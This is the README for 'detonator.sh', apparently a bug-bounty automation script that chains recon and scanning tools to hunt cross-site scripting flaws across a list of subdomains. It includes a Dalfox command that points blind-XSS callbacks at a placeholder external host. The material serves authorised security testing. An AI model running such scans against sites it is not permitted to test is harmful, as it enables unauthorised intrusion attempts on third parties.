# detonator.sh
![image](https://github.com/DYasmanovych/detonator/assets/66996160/65be295e-ab06-4e2f-b016-e0a17988f8f8)





## Overview
This script is designed to process a list of active subdomains to identify and test for potential XSS vulnerabilities by utilizing several security tools. The script processes the subdomains provided in the input file, extracts unique endpoints, and tests for XSS vulnerabilities.

## How to install
```bash
git clone https://github.com/DYasmanovych/detonator.git
```
## Usage
To run the script, use the following command:

```bash
./detonator.sh <input_file>
```
Where <input_file> is a file containing URLs of alive subdomains, one per line, in the format: https://example.com.

## Dependencies
This script requires the installation of the following tools:

- Katana: For endpoint extraction.
- gau: For fetching historical URLs from the Wayback Machine.
- uro: For filtering unique endpoints.
- gf: For pattern matching of potential XSS vulnerabilities.
- Gxss: For refining XSS payloads.
- Dalfox: For XSS scanning.
Ensure all dependencies are installed and properly configured before running the script.

## Important Notes
You must replace the blind XSS callback URL in the Dalfox command within the script to point to your own server/webhook.
Code string:
```bash
dalfox file XSS_Ref.txt -b https://EXAMPLE.bxss.in -o Vulnerable_XSS.txt
```
